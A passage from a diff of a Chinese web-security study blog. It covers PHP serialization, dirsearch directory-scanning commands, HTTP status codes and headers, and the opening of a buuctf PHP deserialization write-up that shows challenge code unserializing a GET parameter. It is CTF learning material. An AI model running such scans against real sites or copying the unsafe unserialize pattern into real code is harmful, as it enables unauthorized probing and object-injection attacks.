class="string">&#x27;User &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="comment">// “.”表示字符串连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="variable">$usr</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="comment">//设置数据</span></span><br><span class="line"><span class="variable">$usr</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$usr</span>-&gt;name = <span class="string">&#x27;Hardworking666&#x27;</span>;</span><br><span class="line"><span class="comment">//输出数据</span></span><br><span class="line"><span class="variable">$usr</span>-&gt;<span class="title function_ invoke__">printdata</span>();</span><br><span class="line"><span class="comment">//输出序列化后的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$usr</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>输出结果</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User Hardworking666 is <span class="number">18</span> years old.</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Hardworking666&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>序列化格式</p>
+<h4 id="四-dirsearch用法"><a href="#四-dirsearch用法" class="headerlink" title="四.dirsearch用法"></a>四.dirsearch用法</h4><p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a>      就OK了</p>
+<p>再高级一点就是加上网站语言，</p>
+<p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -e php          -e 后面接网站语言，这里php做例子。</p>
+<p>还有在高级点的就是</p>
+<p>  python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -w 指定字典</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://ca4aba23-6dea-4a70-9bf8-3208c5714f83.node5.buuoj.cn -w db/dicc.txt</span><br></pre></td></tr></table></figure>
 
-      
-       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
-    </div>
-</article>
+<p>  python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -r 递归目录（跑出目录后，继续跑目录下面的目录）<br>  python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> –random-agents 使用随机UA</p>
+<h4 id="五-HTTP"><a href="#五-HTTP" class="headerlink" title="五.HTTP"></a>五.HTTP</h4><h5 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h5><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p>
+<p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。。</p>
+<p>下面是常见的 HTTP 状态码：</p>
+<ul>
+<li>200 - 请求成功</li>
+<li>301 - 资源（网页等）被永久转移到其它URL</li>
+<li>404 - 请求的资源（网页等）不存在</li>
+<li>500 - 内部服务器错误</li>
+</ul>
+<h5 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h5><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p>
+<table>
+<thead>
+<tr>
+<th align="left">分类</th>
+<th align="left">分类描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1**</td>
+<td align="left">信息，服务器收到请求，需要请求者继续执行操作</td>
+</tr>
+<tr>
+<td align="left">2**</td>
+<td align="left">成功，操作被成功接收并处理</td>
+</tr>
+<tr>
+<td align="left">3**</td>
+<td align="left">重定向，需要进一步的操作以完成请求</td>
+</tr>
+<tr>
+<td align="left">4**</td>
+<td align="left">客户端错误，请求包含语法错误或无法完成请求</td>
+</tr>
+<tr>
+<td align="left">5**</td>
+<td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td>
+</tr>
+</tbody></table>
+<p>HTTP状态码列表:</p>
+<table>
+<thead>
+<tr>
+<th align="left">状态码</th>
+<th align="left">状态码英文名称</th>
+<th align="left">中文描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">100</td>
+<td align="left">Continue</td>
+<td align="left">继续。客户端应继续其请求</td>
+</tr>
+<tr>
+<td align="left">101</td>
+<td align="left">Switching Protocols</td>
+<td align="left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">200</td>
+<td align="left">OK</td>
+<td align="left">请求成功。一般用于GET与POST请求</td>
+</tr>
+<tr>
+<td align="left">201</td>
+<td align="left">Created</td>
+<td align="left">已创建。成功请求并创建了新的资源</td>
+</tr>
+<tr>
+<td align="left">202</td>
+<td align="left">Accepted</td>
+<td align="left">已接受。已经接受请求，但未处理完成</td>
+</tr>
+<tr>
+<td align="left">203</td>
+<td align="left">Non-Authoritative Information</td>
+<td align="left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td>
+</tr>
+<tr>
+<td align="left">204</td>
+<td align="left">No Content</td>
+<td align="left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
+</tr>
+<tr>
+<td align="left">205</td>
+<td align="left">Reset Content</td>
+<td align="left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
+</tr>
+<tr>
+<td align="left">206</td>
+<td align="left">Partial Content</td>
+<td align="left">部分内容。服务器成功处理了部分GET请求</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">300</td>
+<td align="left">Multiple Choices</td>
+<td align="left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
+</tr>
+<tr>
+<td align="left">301</td>
+<td align="left">Moved Permanently</td>
+<td align="left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td>
+</tr>
+<tr>
+<td align="left">302</td>
+<td align="left">Found</td>
+<td align="left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td>
+</tr>
+<tr>
+<td align="left">303</td>
+<td align="left">See Other</td>
+<td align="left">查看其它地址。与301类似。使用GET和POST请求查看</td>
+</tr>
+<tr>
+<td align="left">304</td>
+<td align="left">Not Modified</td>
+<td align="left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td>
+</tr>
+<tr>
+<td align="left">305</td>
+<td align="left">Use Proxy</td>
+<td align="left">使用代理。所请求的资源必须通过代理访问</td>
+</tr>
+<tr>
+<td align="left">306</td>
+<td align="left">Unused</td>
+<td align="left">已经被废弃的HTTP状态码</td>
+</tr>
+<tr>
+<td align="left">307</td>
+<td align="left">Temporary Redirect</td>
+<td align="left">临时重定向。与302类似。使用GET请求重定向</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">400</td>
+<td align="left">Bad Request</td>
+<td align="left">客户端请求的语法错误，服务器无法理解</td>
+</tr>
+<tr>
+<td align="left">401</td>
+<td align="left">Unauthorized</td>
+<td align="left">请求要求用户的身份认证</td>
+</tr>
+<tr>
+<td align="left">402</td>
+<td align="left">Payment Required</td>
+<td align="left">保留，将来使用</td>
+</tr>
+<tr>
+<td align="left">403</td>
+<td align="left">Forbidden</td>
+<td align="left">服务器理解请求客户端的请求，但是拒绝执行此请求</td>
+</tr>
+<tr>
+<td align="left">404</td>
+<td align="left">Not Found</td>
+<td align="left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td>
+</tr>
+<tr>
+<td align="left">405</td>
+<td align="left">Method Not Allowed</td>
+<td align="left">客户端请求中的方法被禁止</td>
+</tr>
+<tr>
+<td align="left">406</td>
+<td align="left">Not Acceptable</td>
+<td align="left">服务器无法根据客户端请求的内容特性完成请求</td>
+</tr>
+<tr>
+<td align="left">407</td>
+<td align="left">Proxy Authentication Required</td>
+<td align="left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
+</tr>
+<tr>
+<td align="left">408</td>
+<td align="left">Request Time-out</td>
+<td align="left">服务器等待客户端发送的请求时间过长，超时</td>
+</tr>
+<tr>
+<td align="left">409</td>
+<td align="left">Conflict</td>
+<td align="left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
+</tr>
+<tr>
+<td align="left">410</td>
+<td align="left">Gone</td>
+<td align="left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
+</tr>
+<tr>
+<td align="left">411</td>
+<td align="left">Length Required</td>
+<td align="left">服务器无法处理客户端发送的不带Content-Length的请求信息</td>
+</tr>
+<tr>
+<td align="left">412</td>
+<td align="left">Precondition Failed</td>
+<td align="left">客户端请求信息的先决条件错误</td>
+</tr>
+<tr>
+<td align="left">413</td>
+<td align="left">Request Entity Too Large</td>
+<td align="left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td>
+</tr>
+<tr>
+<td align="left">414</td>
+<td align="left">Request-URI Too Large</td>
+<td align="left">请求的URI过长（URI通常为网址），服务器无法处理</td>
+</tr>
+<tr>
+<td align="left">415</td>
+<td align="left">Unsupported Media Type</td>
+<td align="left">服务器无法处理请求附带的媒体格式</td>
+</tr>
+<tr>
+<td align="left">416</td>
+<td align="left">Requested range not satisfiable</td>
+<td align="left">客户端请求的范围无效</td>
+</tr>
+<tr>
+<td align="left">417</td>
+<td align="left">Expectation Failed</td>
+<td align="left">服务器无法满足Expect的请求头信息</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">500</td>
+<td align="left">Internal Server Error</td>
+<td align="left">服务器内部错误，无法完成请求</td>
+</tr>
+<tr>
+<td align="left">501</td>
+<td align="left">Not Implemented</td>
+<td align="left">服务器不支持请求的功能，无法完成请求</td>
+</tr>
+<tr>
+<td align="left">502</td>
+<td align="left">Bad Gateway</td>
+<td align="left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
+</tr>
+<tr>
+<td align="left">503</td>
+<td align="left">Service Unavailable</td>
+<td align="left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td>
+</tr>
+<tr>
+<td align="left">504</td>
+<td align="left">Gateway Time-out</td>
+<td align="left">充当网关或代理的服务器，未及时从远端服务器获取请求</td>
+</tr>
+<tr>
+<td align="left">505</td>
+<td align="left">HTTP Version not supported</td>
+<td align="left">服务器不支持请求的HTTP协议的版本，无法完成处理</td>
+</tr>
+</tbody></table>
+<h5 id="HTTP-请求方法"><a href="#HTTP-请求方法" class="headerlink" title="HTTP 请求方法"></a>HTTP 请求方法</h5><p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p>
+<p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD 方法。</p>
+<p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p>
+<table>
+<thead>
+<tr>
+<th align="left">序号</th>
+<th align="left">方法</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">GET</td>
+<td align="left">请求指定的页面信息，并返回实体主体。</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">HEAD</td>
+<td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">POST</td>
+<td align="left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td>
+</tr>
+<tr>
+<td align="left">4</td>
+<td align="left">PUT</td>
+<td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td>
+</tr>
+<tr>
+<td align="left">5</td>
+<td align="left">DELETE</td>
+<td align="left">请求服务器删除指定的页面。</td>
+</tr>
+<tr>
+<td align="left">6</td>
+<td align="left">CONNECT</td>
+<td align="left">HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td>
+</tr>
+<tr>
+<td align="left">7</td>
+<td align="left">OPTIONS</td>
+<td align="left">允许客户端查看服务器的性能。</td>
+</tr>
+<tr>
+<td align="left">8</td>
+<td align="left">TRACE</td>
+<td align="left">回显服务器收到的请求，主要用于测试或诊断。</td>
+</tr>
+<tr>
+<td align="left">9</td>
+<td align="left">PATCH</td>
+<td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td>
+</tr>
+</tbody></table>
+<h5 id="HTTP-响应头信息"><a href="#HTTP-响应头信息" class="headerlink" title="HTTP 响应头信息"></a>HTTP 响应头信息</h5><p>HTTP请求头提供了关于请求，响应或者其他的发送实体的信息。</p>
+<p>在本章节中我们将具体来介绍HTTP响应头信息。</p>
+<table>
+<thead>
+<tr>
+<th align="left">应答头</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Allow</td>
+<td align="left">服务器支持哪些请求方法（如GET、POST等）。</td>
+</tr>
+<tr>
+<td align="left">Content-Encoding</td>
+<td align="left">文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</td>
+</tr>
+<tr>
+<td align="left">Content-Length</td>
+<td align="left">表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td>
+</tr>
+<tr>
+<td align="left">Content-Type</td>
+<td align="left">表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td>
+</tr>
+<tr>
+<td align="left">Date</td>
+<td align="left">当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td>
+</tr>
+<tr>
+<td align="left">Expires</td>
+<td align="left">应该在什么时候认为文档已经过期，从而不再缓存它？</td>
+</tr>
+<tr>
+<td align="left">Last-Modified</td>
+<td align="left">文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td>
+</tr>
+<tr>
+<td align="left">Location</td>
+<td align="left">表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td>
+</tr>
+<tr>
+<td align="left">Refresh</td>
+<td align="left">表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL&#x3D;<a target="_blank" rel="noopener" href="http://host/path%22)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82">http://host/path&quot;)让浏览器读取指定的页面。</a> 注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV&#x3D;”Refresh” CONTENT&#x3D;”5;URL&#x3D;<a target="_blank" rel="noopener" href="http://host/path%22%EF%BC%9E%E5%AE%9E%E7%8E%B0%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BA%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0%E6%88%96%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8CGI%E6%88%96Servlet%E7%9A%84HTML%E7%BC%96%E5%86%99%E8%80%85%E5%8D%81%E5%88%86%E9%87%8D%E8%A6%81%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E5%AF%B9%E4%BA%8EServlet%E6%9D%A5%E8%AF%B4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AERefresh%E5%A4%B4%E6%9B%B4%E5%8A%A0%E6%96%B9%E4%BE%BF%E3%80%82">http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</a>  注意Refresh的意义是”N秒之后刷新本页面或访问指定页面”，而不是”每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV&#x3D;”Refresh” …＞。  注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</td>
+</tr>
+<tr>
+<td align="left">Server</td>
+<td align="left">服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td>
+</tr>
+<tr>
+<td align="left">Set-Cookie</td>
+<td align="left">设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td>
+</tr>
+<tr>
+<td align="left">WWW-Authenticate</td>
+<td align="left">客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm&#x3D;＼”executives＼””)。 注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</td>
+</tr>
+</tbody></table>
+<h4 id="buuctf-PHP【极客大挑战】"><a href="#buuctf-PHP【极客大挑战】" class="headerlink" title="buuctf PHP【极客大挑战】"></a>buuctf PHP【极客大挑战】</h4><p><img src="/2023/09/28/web%E5%AD%A6%E4%B9%A0/Users\tong\AppData\Roaming\Typora\typora-user-images\image-20240409133715947.png" alt="image-20240409133715947"></p>
+<p>dirsearch 扫后台备份文件  <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>index.php  :页面传入了一个select参数并把他反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">1.include &#x27;class.php&#x27;;：这行代码用于引入文件class.php，该文件中包含了一个类的定义或其他相关的代码。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.$select = $_GET[&#x27;select&#x27;];：这行代码将HTTP GET请求中名为select的参数的值赋给变量$select。$_GET是一个包含了所有通过GET方法发送到当前脚本的参数和值的全局数组。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.$res=unserialize(@$select);：这行代码将变量$select的值进行反序列化，并将结果赋给变量$res。unserialize()函数用于将之前通过serialize()函数序列化的字符串转换回原始的PHP数据类型。@符号用于抑制可能出现的反序列化错误。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
 
 
-<p>
-    <a  class="dashang" onclick="dashangToggle()">💰</a>
-</p>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;<span class="comment">//当用户名为 &#x27;admin&#x27; 时，输出全局变量 $flag 的值</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
-
-
-
-
-    
-
-
-
-
-    </div>
-    <div class="copyright">
-        <p class="footer-entry">
-    ©2016-2020 Yelog
-</p>
-<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
-
-    </div>
-    <div class="full-toc">
-        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
-<a class="" id="rocket" ></a>
-
-    </div>
+  </div>
+  <div id="gitalk-container"></div>
 </div>
 
-<div class="hide_box" onclick="dashangToggle()"></div>
-<div class="shang_box">
-    <a class="shang_close"  onclick="dashangToggle()">×</a>
-    <div class="shang_tit">
-        <p>Help us with donation</p>
-    </div>
-    <div class="shang_payimg">
-        <div class="pay_img">
-            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
-            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
-        </div>
-    </div>
-    <div class="shang_payselect">
-        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
-    </div>
-</div>
-
-
-</body>
-<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
-
-<script src="/js/script.js?v=1.1.0" ></script>
 <script>
-    var img_resize = 'default';
-    function initArticle() {
-        /*渲染对应的表格样式*/
-        
-            $("#post .pjax table").addClass("green_title");
-        
-
-        /*渲染打赏样式*/
-        
-        $("input[name=pay]").on("click", function () {
-            if($("input[name=pay]:checked").val()=="weixin"){
-                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
-            } else {
-                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
-            }
-        })
-        
-
-        /*高亮代码块行号*/
-        
-
-        /*访问数量*/
-        
-        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
-        
-
-        /*代码高亮，行号对齐*/
-        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
-
-        
-        
-    }
-
-    /*打赏页面隐藏与展示*/
-    
-    function dashangToggle() {
-        $(".shang_box").fadeToggle();
-        $(".hide_box").fadeToggle();
-    }
-    
-
+  
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
+});
 </script>
 
-<!--加入行号的高亮代码块样式-->
-
-<!--自定义样式设置-->
 <style>
-    
-    
-    .nav {
-        width: 542px;
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
     }
-    .nav.fullscreen {
-        margin-left: -542px;
-    }
-    .nav-left {
-        width: 120px;
-    }
-    
-    
-    @media screen and (max-width: 1468px) {
-        .nav {
-            width: 492px;
-        }
-        .nav.fullscreen {
-            margin-left: -492px;
-        }
-        .nav-left {
-            width: 100px;
-        }
-    }
-    
-    
-    @media screen and (max-width: 1024px) {
-        .nav {
-            width: 492px;
-            margin-left: -492px
-        }
-        .nav.fullscreen {
-            margin-left: 0;
-        }
-    }
-    
-    @media screen and (max-width: 426px) {
-        .nav {
-            width: 100%;
-        }
-        .nav-left {
-            width: 100%;
-        }
-    }
-    
-    
